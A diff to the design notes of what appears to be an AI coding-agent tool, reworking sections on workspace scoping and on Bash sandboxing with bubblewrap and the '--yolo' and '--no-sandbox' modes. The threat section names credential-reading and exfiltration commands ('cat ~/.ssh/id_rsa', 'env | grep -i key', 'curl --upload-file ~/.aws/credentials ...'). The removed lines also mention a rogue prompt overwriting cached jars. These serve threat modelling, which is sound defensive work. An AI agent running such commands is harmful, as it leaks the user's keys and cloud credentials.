@@ -45,19 +45,9 @@ in scope of the design exercise, considered, and left out on purpose.
 
 ## Workspace v2
 
-Plans recorded in `lib/pikuri/workspace/filesystem.rb`'s "Future extensions"
-RDoc section, summarised here so they show up in a doc-only sweep:
-
-- **Multi-root workspace.** A read-set wider than the write-set —
-  e.g. `~/.claude/skills` readable, project CWD writable. The
-  `Filesystem` class splits `resolve_for_read` /
-  `resolve_for_write` to make this seamless.
 - **`Workspace::Filesystem::ALLOW_ALL`.** Unrestricted reads + writes,
   intended for Docker / dev-container mode where the whole sandbox is
   the workspace. Pairs naturally with `--yolo`.
-- Support for sandboxed bash (via bubblewrap)? Not bad, but what
-  should be allowed? E.g. ~/.m2/repository and/or ~/.gradle/caches for Maven/Gradle builders? RW? Rogue prompt could overwrite malicious jar files. What about Mise-bundled jvm and ruby?
-  Everything except ~/.ssh and ~/.aws? Too permissive.
 
 ## Security perspective
 
@@ -124,16 +114,18 @@ tool* per-invocation with bubblewrap / nsjail / Landlock / a
 Firecracker microVM. Sysbox or rootless Podman-in-Podman are escape
 hatches if true nesting is unavoidable.
 
-### Bash escapes the workspace seam
+### Unsandboxed Bash modes
 
-`Workspace::Filesystem` constrains `Read` / `Write` / `Edit` / `Grep` /
-`Glob`. **It does not constrain `Bash`.** `cat ~/.ssh/id_rsa`,
-`env | grep -i key`, `curl --upload-file ~/.aws/credentials ...` all
-run as the user. The Confirmer is the only thing between yolo-off mode
-and full user-privilege exfil; "confirm every command" works for the
-first 20 prompts and then humans stop reading. This is the strongest
-argument for the sandboxing trajectory recorded under the
-permission-system deferral.
+`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
+readable/writable roots + an OS-runtime baseline, and is the default in
+`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
+there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
+`curl --upload-file ~/.aws/credentials ...` all run as the user, and
+the per-command Confirmer is the only line of defense (`--yolo`
+disables that too). The help text says "use only with an outer
+sandbox" but nothing enforces it. Worth considering: detect a
+container / VM at boot and refuse `--no-sandbox` outside one, or at
+least surface a louder warning than the current `LOGGER.warn`.
 
 ### Egress is broader than `web_search`
 
